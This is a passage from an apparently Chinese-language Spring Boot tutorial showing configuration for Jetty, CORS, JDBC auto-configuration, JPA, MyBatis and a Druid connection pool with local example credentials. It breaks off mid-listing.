<span class=\"hljs-title function_\">contextDestroyed</span><span class=\"hljs-params\">(ServletContextEvent sce)</span> {\n        System.out.println(<span class=\"hljs-string\">&quot;the project is destroy&quot;</span>);\n    }\n}\n</code></div></pre>\n<h3><a id=\"web_717\"></a>配置其他web容器</h3>\n<pre><div class=\"hljs\"><code class=\"lang-xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">dependency</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">groupId</span>&gt;</span>org.springframework.boot<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">groupId</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">artifactId</span>&gt;</span>spring-boot-starter-web<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">artifactId</span>&gt;</span>\n    <span class=\"hljs-comment\">&lt;!--排除掉默认的tomcat容器--&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">exclusions</span>&gt;</span>\n        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">exclusion</span>&gt;</span>\n            <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">groupId</span>&gt;</span>org.springframework.boot<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">groupId</span>&gt;</span>\n            <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">artifactId</span>&gt;</span>spring-boot-starter-tomcat<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">artifactId</span>&gt;</span>\n        <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">exclusion</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">exclusions</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">dependency</span>&gt;</span>\n<span class=\"hljs-comment\">&lt;!--再引入需要的容器--&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">dependency</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">groupId</span>&gt;</span>org.springframework.boot<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">groupId</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">artifactId</span>&gt;</span>spring-boot-starter-jetty<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">artifactId</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">dependency</span>&gt;</span>\n</code></div></pre>\n<h3><a id=\"_738\"></a>配置跨域请求</h3>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-keyword\">package</span> com.example.config;\n\n<span class=\"hljs-keyword\">import</span> org.springframework.context.annotation.Configuration;\n<span class=\"hljs-keyword\">import</span> org.springframework.web.servlet.config.annotation.CorsRegistry;\n<span class=\"hljs-keyword\">import</span> org.springframework.web.servlet.config.annotation.WebMvcConfigurer;\n\n<span class=\"hljs-meta\">@Configuration</span>\n<span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">CorsConfig</span> <span class=\"hljs-keyword\">implements</span> <span class=\"hljs-title class_\">WebMvcConfigurer</span> {\n    <span class=\"hljs-comment\">/**\n     * 页面跨域访问Controller过滤\n     */</span>\n    <span class=\"hljs-meta\">@Override</span>\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title function_\">addCorsMappings</span><span class=\"hljs-params\">(CorsRegistry registry)</span> {\n        WebMvcConfigurer.<span class=\"hljs-built_in\">super</span>.addCorsMappings(registry);\n        registry.addMapping(<span class=\"hljs-string\">&quot;/**&quot;</span>)\n                .allowedHeaders(<span class=\"hljs-string\">&quot;*&quot;</span>)\n                .allowedMethods(<span class=\"hljs-string\">&quot;POST&quot;</span>, <span class=\"hljs-string\">&quot;GET&quot;</span>, <span class=\"hljs-string\">&quot;DELETE&quot;</span>, <span class=\"hljs-string\">&quot;PUT&quot;</span>)\n                .allowedOrigins(<span class=\"hljs-string\">&quot;*&quot;</span>);\n    }\n}\n</code></div></pre>\n<h2><a id=\"_765\"></a>数据访问</h2>\n<h3><a id=\"SpringBoot_JDBC_767\"></a>SpringBoot JDBC自动配置原理</h3>\n<p>org.springframework.boot.autoconfigure.jdbc</p>\n<ul>\n<li><strong>DataSourceConfiguration</strong></li>\n</ul>\n<pre><code class=\"lang-properties\">配置各种数据源,也可以自定义数据源\n在配置文件中指定spring.datasouce.type=xxx 指定自定义数据源\n</code></pre>\n<ul>\n<li>\n<p><strong>DataSourceAutoConfiguration</strong></p>\n<ul>\n<li>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-meta\">@Import({DataSourcePoolMetadataProvidersConfiguration.class, DataSourceInitializationConfiguration.class})</span>\n<span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">DataSourceAutoConfiguration</span> {}\n</code></div></pre>\n</li>\n<li>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-meta\">@Import({DataSourceInitializerInvoker.class, DataSourceInitializationConfiguration.Registrar.class})</span>\n<span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">DataSourceInitializationConfiguration</span> {DataSourceInitializationConfiguration() {}\n</code></div></pre>\n</li>\n<li>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">DataSourceInitializerInvoker</span> <span class=\"hljs-keyword\">implements</span> <span class=\"hljs-title class_\">ApplicationListener</span>&lt;DataSourceSchemaCreatedEvent&gt;, InitializingBean {\n    <span class=\"hljs-keyword\">private</span> DataSourceInitializer <span class=\"hljs-title function_\">getDataSourceInitializer</span><span class=\"hljs-params\">()</span>\n}\n</code></div></pre>\n</li>\n<li>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">DataSourceInitializer</span> {\n    <span class=\"hljs-comment\">/*执行建表语句脚本 默认是schema-all.sql*/</span>\n    <span class=\"hljs-keyword\">private</span> List&lt;Resource&gt; <span class=\"hljs-title function_\">getScripts</span><span class=\"hljs-params\">(String propertyName, List&lt;String&gt; resources, String fallback)</span> {\n        <span class=\"hljs-keyword\">if</span> (resources != <span class=\"hljs-literal\">null</span>) {\n            <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">this</span>.getResources(propertyName, resources, <span class=\"hljs-literal\">true</span>);\n        } <span class=\"hljs-keyword\">else</span> {\n            <span class=\"hljs-type\">String</span> <span class=\"hljs-variable\">platform</span> <span class=\"hljs-operator\">=</span> <span class=\"hljs-built_in\">this</span>.properties.getPlatform();\n            List&lt;String&gt; fallbackResources = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">ArrayList</span>();\n            <span class=\"hljs-comment\">/*从resources类路径下加载脚本文件*/</span>\n            fallbackResources.add(<span class=\"hljs-string\">&quot;classpath*:&quot;</span> + fallback + <span class=\"hljs-string\">&quot;-&quot;</span> + platform + <span class=\"hljs-string\">&quot;.sql&quot;</span>);\n            fallbackResources.add(<span class=\"hljs-string\">&quot;classpath*:&quot;</span> + fallback + <span class=\"hljs-string\">&quot;.sql&quot;</span>);\n            <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">this</span>.getResources(propertyName, fallbackResources, <span class=\"hljs-literal\">false</span>);\n        }\n    }\n}\n</code></div></pre>\n</li>\n<li>\n<p><strong>自定义脚本文件</strong></p>\n<pre><div class=\"hljs\"><code class=\"lang-yaml\"><span class=\"hljs-attr\">spring:</span>\n  <span class=\"hljs-attr\">datasource:</span>\n    <span class=\"hljs-attr\">url:</span> <span class=\"hljs-string\">jdbc:mysql://localhost:3306/test?useUnicode=true&amp;serverTimezone=UTC</span>\n    <span class=\"hljs-attr\">username:</span> <span class=\"hljs-string\">root</span>\n    <span class=\"hljs-attr\">password:</span> <span class=\"hljs-number\">123456</span>\n    <span class=\"hljs-attr\">driver-class-name:</span> <span class=\"hljs-string\">com.mysql.cj.jdbc.Driver</span>\n    <span class=\"hljs-attr\">initialization-mode:</span> <span class=\"hljs-string\">always</span>       <span class=\"hljs-comment\">#2.x之后的SpringBoot一定要加</span>\n    <span class=\"hljs-comment\"># SpringBoot启动时执行该建表语句</span>\n    <span class=\"hljs-attr\">schema:</span>\n     <span class=\"hljs-bullet\">-</span> <span class=\"hljs-string\">classpath:student_info.sql</span>\n</code></div></pre>\n</li>\n</ul>\n</li>\n</ul>\n<h3><a id=\"SpringBootSpring_Data_JPA_829\"></a>SpringBoot整合Spring Data JPA</h3>\n<p>JPA (java persistence api)</p>\n<h4><a id=\"pomxml_833\"></a>pom.xml</h4>\n<pre><div class=\"hljs\"><code class=\"lang-xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">parent</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">groupId</span>&gt;</span>org.springframework.boot<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">groupId</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">artifactId</span>&gt;</span>spring-boot-starter-parent<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">artifactId</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">version</span>&gt;</span>2.3.0.RELEASE<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">version</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">parent</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">dependencies</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">dependency</span>&gt;</span>\n        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">groupId</span>&gt;</span>org.springframework.boot<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">groupId</span>&gt;</span>\n        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">artifactId</span>&gt;</span>spring-boot-starter-web<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">artifactId</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">dependency</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">dependency</span>&gt;</span>\n        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">groupId</span>&gt;</span>org.projectlombok<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">groupId</span>&gt;</span>\n        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">artifactId</span>&gt;</span>lombok<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">artifactId</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">dependency</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">dependency</span>&gt;</span>\n        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">groupId</span>&gt;</span>org.springframework.boot<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">groupId</span>&gt;</span>\n        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">artifactId</span>&gt;</span>spring-boot-starter-data-jpa<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">artifactId</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">dependency</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">dependency</span>&gt;</span>\n        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">groupId</span>&gt;</span>mysql<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">groupId</span>&gt;</span>\n        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">artifactId</span>&gt;</span>mysql-connector-java<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">artifactId</span>&gt;</span>\n        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">version</span>&gt;</span>8.0.19<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">version</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">dependency</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">dependencies</span>&gt;</span>\n</code></div></pre>\n<h4><a id=\"applicationyml_862\"></a>application.yml</h4>\n<pre><div class=\"hljs\"><code class=\"lang-yaml\"><span class=\"hljs-attr\">spring:</span>\n    <span class=\"hljs-attr\">datasource:</span>\n    <span class=\"hljs-attr\">url:</span> <span class=\"hljs-string\">jdbc:mysql://localhost:3306/test?useSSL=false&amp;serverTimezone=UTC</span>\n    <span class=\"hljs-attr\">username:</span> <span class=\"hljs-string\">root</span>\n    <span class=\"hljs-attr\">password:</span> <span class=\"hljs-number\">123456</span>\n    <span class=\"hljs-attr\">driver-class-name:</span> <span class=\"hljs-string\">com.mysql.cj.jdbc.Driver</span>\n<span class=\"hljs-attr\">jpa:</span>\n    <span class=\"hljs-attr\">show-sql:</span> <span class=\"hljs-literal\">true</span>\n    <span class=\"hljs-attr\">properties:</span>\n        <span class=\"hljs-attr\">hibernate:</span> <span class=\"hljs-literal\">true</span>\n</code></div></pre>\n<h4><a id=\"_877\"></a>实体类</h4>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-keyword\">package</span> cn.qingweico.entity;\n<span class=\"hljs-keyword\">import</span> lombok.Data;\n<span class=\"hljs-keyword\">import</span> javax.persistence.Entity;\n<span class=\"hljs-keyword\">import</span> javax.persistence.GeneratedValue;\n<span class=\"hljs-keyword\">import</span> javax.persistence.GenerationType;\n<span class=\"hljs-keyword\">import</span> javax.persistence.Id;\n<span class=\"hljs-meta\">@Data</span>\n<span class=\"hljs-comment\">/*@Entity指明这是一个和数据库表字段相互映射的实体类*/</span>\n<span class=\"hljs-meta\">@Entity</span>\n<span class=\"hljs-comment\">/*@Table指明映射的数据库表名 默认是实体类名小写*/</span>\n<span class=\"hljs-meta\">@Table(name = &quot;student&quot;)</span>\n<span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">Student</span> {\n    <span class=\"hljs-comment\">/*表明这是和数据库表主键字段映射的属性*/</span>\n    <span class=\"hljs-meta\">@Id</span>\n    <span class=\"hljs-comment\">/*主键由数据库自动生成（主要是自动增长型）*/</span>\n    <span class=\"hljs-meta\">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>\n    <span class=\"hljs-comment\">/*指定和该属性映射的数据库表中字段名称 默认是该属性名称*/</span>\n    <span class=\"hljs-meta\">@Column(name = &quot;id&quot;)</span>\n    <span class=\"hljs-keyword\">private</span>  Integer id;\n    <span class=\"hljs-keyword\">private</span> String name;\n    <span class=\"hljs-keyword\">private</span> String number;\n}\n</code></div></pre>\n<h4><a id=\"dao_904\"></a>dao</h4>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-keyword\">package</span> cn.qingweico.dao;\n<span class=\"hljs-keyword\">import</span> cn.qingweico.entity.Student;\n<span class=\"hljs-keyword\">import</span> org.springframework.data.jpa.repository.JpaRepository;\n<span class=\"hljs-comment\">/*JpaRepository中泛型前者是操作的实体类后者是数据库表中的主键的类型*/</span>\n<span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">interface</span> <span class=\"hljs-title class_\">StudentDao</span> <span class=\"hljs-keyword\">extends</span> <span class=\"hljs-title class_\">JpaRepository</span>&lt;Student,Integer&gt; {\n}\n</code></div></pre>\n<h3><a id=\"SpringBootMybatis_915\"></a>SpringBoot整合Mybatis</h3>\n<h4><a id=\"pomxml_917\"></a>pom.xml</h4>\n<pre><div class=\"hljs\"><code class=\"lang-xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">parent</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">groupId</span>&gt;</span>org.springframework.boot<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">groupId</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">artifactId</span>&gt;</span>spring-boot-starter-parent<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">artifactId</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">version</span>&gt;</span>2.3.0.RELEASE<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">version</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">parent</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">dependencies</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">dependency</span>&gt;</span>\n        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">groupId</span>&gt;</span>org.springframework.boot<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">groupId</span>&gt;</span>\n        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">artifactId</span>&gt;</span>spring-boot-starter-web<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">artifactId</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">dependency</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">dependency</span>&gt;</span>\n        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">groupId</span>&gt;</span>org.projectlombok<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">groupId</span>&gt;</span>\n        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">artifactId</span>&gt;</span>lombok<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">artifactId</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">dependency</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">dependency</span>&gt;</span>\n        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">groupId</span>&gt;</span>org.mybatis.spring.boot<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">groupId</span>&gt;</span>\n        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">artifactId</span>&gt;</span>\n        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">version</span>&gt;</span>1.3.2<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">version</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">dependency</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">dependency</span>&gt;</span>\n        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">groupId</span>&gt;</span>mysql<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">groupId</span>&gt;</span>\n        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">artifactId</span>&gt;</span>mysql-connector-java<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">artifactId</span>&gt;</span>\n        <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">version</span>&gt;</span>8.0.19<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">version</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">dependency</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">dependencies</span>&gt;</span>\n</code></div></pre>\n<h4><a id=\"applicationyml_947\"></a>application.yml</h4>\n<pre><div class=\"hljs\"><code class=\"lang-yaml\"><span class=\"hljs-attr\">spring:</span>\n  <span class=\"hljs-attr\">datasource:</span>\n    <span class=\"hljs-attr\">url:</span> <span class=\"hljs-string\">jdbc:mysql://localhost:3306/test?useUnicode=true&amp;serverTimezone=UTC</span>\n    <span class=\"hljs-attr\">username:</span> <span class=\"hljs-string\">root</span>\n    <span class=\"hljs-attr\">password:</span> <span class=\"hljs-number\">123456</span>\n    <span class=\"hljs-attr\">driver-class-name:</span> <span class=\"hljs-string\">com.mysql.cj.jdbc.Driver</span>\n<span class=\"hljs-attr\">mybatis:</span>\n  <span class=\"hljs-attr\">mapper-locations:</span> <span class=\"hljs-string\">classpath:/mappers/*.xml</span>        <span class=\"hljs-comment\">#配置mapper映射文件路径</span>\n  <span class=\"hljs-attr\">config-locations: classpath:</span> <span class=\"hljs-string\">/mybatis-config.xml</span>  <span class=\"hljs-comment\">#配置mybatis全局配置文件路径</span>\n  <span class=\"hljs-attr\">type-aliases-package:</span> <span class=\"hljs-string\">cn.qingweico.entity</span>         <span class=\"hljs-comment\">#配置包别名</span>\n<span class=\"hljs-attr\">server:</span>\n  <span class=\"hljs-attr\">port:</span> <span class=\"hljs-number\">8848</span>\n<span class=\"hljs-comment\">#MyBatis注解和xml配置可以一起使用</span>\n</code></div></pre>\n<h4><a id=\"_965\"></a>启动类</h4>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-meta\">@MapperScan(&quot;cn.qingweico.dao&quot;)</span> <span class=\"hljs-comment\">/*将mapper接口扫进ioc容器中*/</span>\n</code></div></pre>\n<h3><a id=\"Druid_971\"></a>Druid（主从复制）</h3>\n<h4><a id=\"pomxml_973\"></a>pom.xml</h4>\n<pre><div class=\"hljs\"><code class=\"lang-xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">dependency</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">groupId</span>&gt;</span>com.alibaba<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">groupId</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">artifactId</span>&gt;</span>druid-spring-boot-starter<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">artifactId</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">version</span>&gt;</span>1.1.10<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">version</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">dependency</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">dependency</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">groupId</span>&gt;</span>com.alibaba<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">groupId</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">artifactId</span>&gt;</span>druid<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">artifactId</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">version</span>&gt;</span>1.1.10<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">version</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">dependency</span>&gt;</span>\n</code></div></pre>\n<h4><a id=\"applicationyml_988\"></a>application.yml</h4>\n<pre><div class=\"hljs\"><code class=\"lang-yml\"><span class=\"hljs-attr\">spring:</span>\n  <span class=\"hljs-attr\">datasource:</span>\n    <span class=\"hljs-attr\">masterUrl:</span> <span class=\"hljs-string\">jdbc:mysql://127.0.0.1:3306/tmall?useUnicode=true&amp;serverTimezone=UTC</span>\n    <span class=\"hljs-attr\">slaveUrl:</span> <span class=\"hljs-string\">jdbc:mysql://xxx:3306/tmall?useUnicode=true&amp;serverTimezone=UTC</span>\n    <span class=\"hljs-attr\">username:</span> <span class=\"hljs-string\">root</span>\n    <span class=\"hljs-attr\">password:</span> <span class=\"hljs-number\">123456</span>\n    <span class=\"hljs-attr\">driver-class-name:</span> <span class=\"hljs-string\">com.mysql.cj.jdbc.Driver</span>\n    <span class=\"hljs-attr\">initialization-mode:</span> <span class=\"hljs-string\">always</span>\n    <span class=\"hljs-comment\">#数据源其他配置</span>\n\n    <span class=\"hljs-comment\"># 初始化连接池的大小</span>\n    <span class=\"hljs-attr\">initialSize:</span> <span class=\"hljs-number\">5</span>\n    <span class=\"hljs-comment\"># 连接池中的最小空闲连接数</span>\n    <span class=\"hljs-attr\">minIdle:</span> <span class=\"hljs-number\">5</span>\n    <span class=\"hljs-comment\"># 连接池中的最大的连接数</span>\n    <span class=\"hljs-attr\">maxActive:</span> <span class=\"hljs-number\">20</span>\n    <span class=\"hljs-comment\"># 配置获取连接等待超时的时间</span>\n    <span class=\"hljs-attr\">maxWait:</span> <span class=\"hljs-number\">60000</span>\n    <span class=\"hljs-comment\"># 配置获取连接等待超时的时间</span>\n    <span class=\"hljs-attr\">timeBetweenEvictionRunsMillis:</span> <span class=\"hljs-number\">60000</span>\n    <span class=\"hljs-comment\"># 配置一个连接在池中最小生存的时间,单位是毫秒</span>\n    <span class=\"hljs-attr\">minEvictableIdleTimeMillis:</span> <span class=\"hljs-number\">300000</span>\n    <span class=\"hljs-comment\"># 验证数据库连接的查询语句</span>\n    <span class=\"hljs-attr\">validationQuery:</span> <span class=\"hljs-string\">SELECT</span> <span class=\"hljs-number\">1</span> <span class=\"hljs-string\">FROM</span> <span class=\"hljs-string\">DUAL</span>\n    <span class=\"hljs-comment\"># 获取连接的时候测试连接的有效性</span>\n    <span class=\"hljs-attr\">testWhileIdle:</span> <span class=\"hljs-literal\">true</span>\n    <span class=\"hljs-attr\">testOnBorrow:</span> <span class=\"hljs-literal\">false</span>\n    <span class=\"hljs-attr\">testOnReturn:</span> <span class=\"hljs-literal\">false</span>\n    <span class=\"hljs-comment\"># 是否缓存preparedStatement,</span>\n    <span class=\"hljs-attr\">poolPreparedStatements:</span> <span class=\"hljs-literal\">true</span>\n    <span class=\"hljs-comment\"># 配置监控统计拦截的filters,去掉后监控界面sql无法统计,&#x27;wall&#x27;用于防火墙</span>\n    <span class=\"hljs-attr\">filters:</span> <span class=\"hljs-string\">stat,wall,log4j2</span>\n    <span class=\"hljs-attr\">maxPoolPreparedStatementPerConnectionSize:</span> <span class=\"hljs-number\">20</span>\n    <span class=\"hljs-comment\"># 合并多个DruidDataSource的监控数据</span>\n    <span class=\"hljs-attr\">useGlobalDataSourceStat:</span> <span class=\"hljs-literal\">true</span>\n    <span class=\"hljs-comment\"># 通过connectProperties属性来打开mergeSql功能；慢SQL记录</span>\n    <span class=\"hljs-attr\">connectionProperties:</span> <span class=\"hljs-string\">druid.stat.mergeSql=true;druid.stat.slowSqlMillis=500</span>\n    <span class=\"hljs-comment\">#设置数据源</span>\n    <span class=\"hljs-attr\">type:</span> <span class=\"hljs-string\">com.alibaba.druid.pool.DruidDataSource</span>\n</code></div></pre>\n<h4><a id=\"DruidConfigjava_1032\"></a>DruidConfig.java</h4>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-keyword\">package</span> cn.qingweico.config;\n\n<span class=\"hljs-keyword\">import</span> lombok.Data;\n<span class=\"hljs-keyword\">import</span> lombok.NoArgsConstructor;\n<span class=\"hljs-keyword\">import</span> org.springframework.boot.context.properties.ConfigurationProperties;\n<span class=\"hljs-keyword\">import</span> org.springframework.stereotype.Component;\n\n<span class=\"hljs-comment\">/**\n * <span class=\"hljs-doctag\">@author</span>:周庆伟\n * <span class=\"hljs-doctag\">@date</span>: 2020/12/3\n */</span>\n<span class=\"hljs-meta\">@Component</span>\n<span class=\"hljs-meta\">@ConfigurationProperties(prefix = &quot;spring.datasource&quot;)</span>\n<span class=\"hljs-meta\">@NoArgsConstructor</span>\n<span class=\"hljs-meta\">@Data</span>\n<span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">DruidConfig</span> {\n    <span class=\"hljs-keyword\">private</span> String masterUrl;\n    <span class=\"hljs-keyword\">private</span> String slaveUrl;\n    <span class=\"hljs-keyword\">private</span> String driverClassName;\n    <span class=\"hljs-keyword\">private</span> String username;\n    <span class=\"hljs-keyword\">private</span> String password;\n    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-type\">int</span> initialSize;\n    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-type\">int</span> minIdle;\n    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-type\">int</span> maxActive;\n    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-type\">int</span> maxWait;\n    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-type\">int</span> timeBetweenEvictionRunsMillis;\n    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-type\">int</span> minEvictableIdleTimeMillis;\n    <span class=\"hljs-keyword\">private</span> String validationQuery;\n    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-type\">boolean</span> testWhileIdle;\n    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-type\">boolean</span> testOnBorrow;\n    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-type\">boolean</span> testOnReturn;\n    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-type\">boolean</span> poolPreparedStatements;\n    <span class=\"hljs-keyword\">private</span> String filters;\n    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-type\">int</span> maxPoolPreparedStatementPerConnectionSize;\n    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-type\">boolean</span> useGlobalDataSourceStat;\n    <span class=\"hljs-keyword\">private</span> String connectionProperties;\n\n}\n\n</code></div></pre>\n<h4><a id=\"MyDruidConfigjava_1076\"></a>MyDruidConfig.java</h4>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-keyword\">package</span> cn.qingweico.config;\n\n<span class=\"hljs-keyword\">import</span> com.alibaba.druid.pool.DruidDataSource;\n<span class=\"hljs-keyword\">import</span> com.alibaba.druid.support.http.StatViewServlet;\n<span class=\"hljs-keyword\">import</span> com.alibaba.druid.support.http.WebStatFilter;\n<span class=\"hljs-keyword\">import</span> 